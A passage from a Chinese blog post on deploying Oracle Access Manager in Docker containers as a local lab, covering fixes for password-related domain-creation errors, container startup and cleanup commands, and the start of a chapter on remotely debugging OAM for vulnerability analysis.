</span></span></code></pre></td></tr></table></div></div><p>从这里 <a href=https://github.com/oracle/docker-images/issues/844#issuecomment-389884511>https://github.com/oracle/docker-images/issues/844#issuecomment-389884511</a> 看到可能是密码复杂度不够，导致无法设置密码。</p><p>启动容器的命令改为以下。将其中 <code>ADMIN_PASSWORD</code> 和 <code>DB_SCHEMA_PASSWORD</code> 的复杂度变高。</p><p>其中<code>ADMIN_PASSWORD</code> 应该是weblogic管理台的密码。<code>DB_SCHEMA_PASSWORD</code> 是 <code>password you want to set for the RCU schemas</code> 。</p><p>那么什么是<code>RCU schemas</code> 呢？什么是RCU呢？不太理解，先跳过。</p><blockquote><p>Repository Creation Utility is a graphical and CLI-based tool used to create and manage Oracle Fusion Middleware database schemas.</p></blockquote><p>改进两个密码的复杂度重新创建容器。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run -d --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Dbsch3m@ -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span></code></pre></td></tr></table></div></div><p>并使用 <code>sudo docker logs -ft oamadmin </code>查看新建过程打印出来的日志，看到问题得到了解决。</p><h4 id=报错五创建domain失败>报错五：创建domain失败<a hidden class=anchor aria-hidden=true href=#报错五创建domain失败>#</a></h4><p>可以看到前几个步骤都顺利完成了，但也出现了新的问题。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-41>41</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>类似前文日志
</span></span><span style=display:flex><span>INFO: Creating Admin server...
</span></span><span style=display:flex><span>INFO: Enabling SSL PORT for AdminServer...
</span></span><span style=display:flex><span>Creating Node Managers...
</span></span><span style=display:flex><span>Will create Base domain at /u01/oracle/user_projects/domains/access_domain
</span></span><span style=display:flex><span>Writing base domain...
</span></span><span style=display:flex><span>Base domain created at /u01/oracle/user_projects/domains/access_domain
</span></span><span style=display:flex><span>Extending domain at /u01/oracle/user_projects/domains/access_domain
</span></span><span style=display:flex><span>Database  172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>Apply Extension templates
</span></span><span style=display:flex><span>Extension Templates added
</span></span><span style=display:flex><span>Extension Templates added
</span></span><span style=display:flex><span>Deleting oam_server1
</span></span><span style=display:flex><span>The default oam_server1 coming from the oam extension template deleted
</span></span><span style=display:flex><span>Deleting oam_policy_mgr1
</span></span><span style=display:flex><span>The default oam_server1 coming from the oam extension template deleted
</span></span><span style=display:flex><span>Configuring JDBC Templates ...
</span></span><span style=display:flex><span>Configuring the Service Table DataSource...
</span></span><span style=display:flex><span>fmwDatabase  jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>Getting Database Defaults...
</span></span><span style=display:flex><span>Error: getDatabaseDefaults() failed. Do dumpStack() to see details.
</span></span><span style=display:flex><span>Error: runCmd() failed. Do dumpStack() to see details.
</span></span><span style=display:flex><span>Problem invoking WLST - Traceback (innermost last):
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 513, in ?
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 124, in createOAMDomain
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 328, in extendOamDomain
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 259, in configureJDBCTemplates
</span></span><span style=display:flex><span>  File &#34;/tmp/WLSTOfflineIni7074819690261705056.py&#34;, line 267, in getDatabaseDefaults
</span></span><span style=display:flex><span>  File &#34;/tmp/WLSTOfflineIni7074819690261705056.py&#34;, line 19, in command
</span></span><span style=display:flex><span>Failed to build JDBC Connection object: 
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69)
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085)
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738)
</span></span><span style=display:flex><span>	at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source)
</span></span><span style=display:flex><span>	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
</span></span><span style=display:flex><span>	at java.lang.reflect.Method.invoke(Method.java:498)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException: Got exception when auto configuring the schema component(s) with data obtained from shadow table: 
</span></span><span style=display:flex><span>Failed to build JDBC Connection object: 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Domain Creation Failed.. Please check the Domain Logs
</span></span></code></pre></td></tr></table></div></div><h4 id=解决五修改db_schema_password>解决五：修改<code>DB_SCHEMA_PASSWORD</code><a hidden class=anchor aria-hidden=true href=#解决五修改db_schema_password>#</a></h4><p>从日志看到是在 <code>Getting Database Defaults...</code> 阶段出现的问题，搜索 <code>getDatabaseDefaults() failed. Do dumpStack() to see details.</code> 发现<a href=https://github.com/oracle/docker-images/issues/1633>这个github issue</a>有讨论。</p><p>看到<a href=https://github.com/freneticdisc/oracle-fmw-tooling/issues/1#issuecomment-236911279>有人</a>说是 <code>schema password</code> 的问题，于是随便改<code>DB_SCHEMA_PASSWORD</code> ，改成<code>Oradoc_db1</code> 还是不行，改成<code>Oradoc_db2</code>就可以了，我也不知道是什么原因😓不解</p><p><img loading=lazy src=image-20220319001023127.png alt=image-20220319001023127></p><p>总之呢，用这个命令，就可以跑起来三个容器中的第一个了！</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run -d --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span></code></pre></td></tr></table></div></div><h4 id=成果>成果<a hidden class=anchor aria-hidden=true href=#成果>#</a></h4><p><img loading=lazy src=image-20220319001206652.png alt=image-20220319001206652></p><h2 id=创建容器二oamms>④创建容器二oamms<a hidden class=anchor aria-hidden=true href=#创建容器二oamms>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run -d -p 14100:14100 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>14100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_server1 --env MS_HOST<span style=color:#f92672>=</span>oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220319002053797.png alt=image-20220319002053797></p><h2 id=创建容器三oampolicy>⑤创建容器三oampolicy<a hidden class=anchor aria-hidden=true href=#创建容器三oampolicy>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run -d -p 15100:15100 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>15100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_policy_mgr1 --env MS_HOST<span style=color:#f92672>=</span>oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220319002625756.png alt=image-20220319002625756></p><h2 id=验证服务可用性>⑥验证服务可用性<a hidden class=anchor aria-hidden=true href=#验证服务可用性>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker inspect -f <span style=color:#e6db74>&#39;{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}&#39;</span> oamadmin oamms oampolicy myOracleDB
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220319003016738.png alt=image-20220319003016738></p><table><thead><tr><th><strong>Console or Page</strong></th><th><strong>URL</strong></th></tr></thead><tbody><tr><td>WebLogic Administration Console</td><td><code>http://&lt;oamadmin_ip>:7001/console</code></td></tr><tr><td>Oracle Enterprise Manager Console</td><td><code>http://&lt;oamadmin_ip>:7001/em</code></td></tr><tr><td>Oracle Access Management Console</td><td><code>http://&lt;oamadmin_ip>:7001/oamconsole</code></td></tr><tr><td>OAM Server Logout</td><td><code>http://&lt;oamms_ip>:14100/oam/server/logout</code></td></tr><tr><td>Policy Manager Access</td><td><code>http://&lt;oampolicy_ip>:15100/access</code></td></tr></tbody></table><p>各服务截图</p><p><img loading=lazy src=image-20220319004128564.png alt=image-20220319004128564></p><p><img loading=lazy src=image-20220319004142916.png alt=image-20220319004142916></p><p><img loading=lazy src=image-20220319004039342.png alt=image-20220319004039342></p><p><img loading=lazy src=image-20220319004207596.png alt=image-20220319004207596></p><p><img loading=lazy src=image-20220319004232583.png alt=image-20220319004232583></p><p><img loading=lazy src=image-20220319004241815.png alt=image-20220319004241815></p><h2 id=启停与删除>⑦启停与删除<a hidden class=anchor aria-hidden=true href=#启停与删除>#</a></h2><p>启停</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker stop oamadmin oamms oampolicy myOracleDB
</span></span><span style=display:flex><span>sudo docker start oamadmin oamms oampolicy myOracleDB
</span></span></code></pre></td></tr></table></div></div><p>删除</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker stop oamadmin oamms oampolicy myOracleDB
</span></span><span style=display:flex><span>sudo docker rm oamadmin oamms oampolicy myOracleDB
</span></span><span style=display:flex><span>sudo rm -rf /scratch/user_projects
</span></span></code></pre></td></tr></table></div></div><h1 id=远程调试oam>远程调试OAM<a hidden class=anchor aria-hidden=true href=#远程调试oam>#</a></h1><p>本章节描述了拥有一个本地运行的OAM之后开启远程调试，以及从仅知道漏洞接口，到定位漏洞主机/容器、定位漏洞进程、定位漏洞代码、再到下载部署包和搭建调试项目，到最终能够顺利进行无源码远程调试的详细过程。其中也体现了Java web远程调试的基本流程和思路。</p><h2 id=大纲-1>大纲<a hidden class=anchor aria-hidden=true href=#大纲-1>#</a></h2><p>OAM包括多个容器，我们需要先定位出来分析这个漏洞所需要关注的容器和进程，以调试模式重启该进程，将调试端口从容器中暴露给用于调试的主机，然后将对应进程的部署包和依赖包下载到调试主机，最后通过idea进行常规的Java web远程无源码动态调试。</p><h2 id=步骤汇总-1>步骤汇总<a hidden class=anchor aria-hidden=true href=#步骤汇总-1>#</a></h2><ol><li>参照 ”附录一：本地搭建OAM运行环境“ 的 ”步骤汇总“ 章节，但在 ”步骤汇总“ 章节中的第7步使用以下命令新建容器，在原命令基础上增加暴露出来容器的调试端口。</li></ol><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1
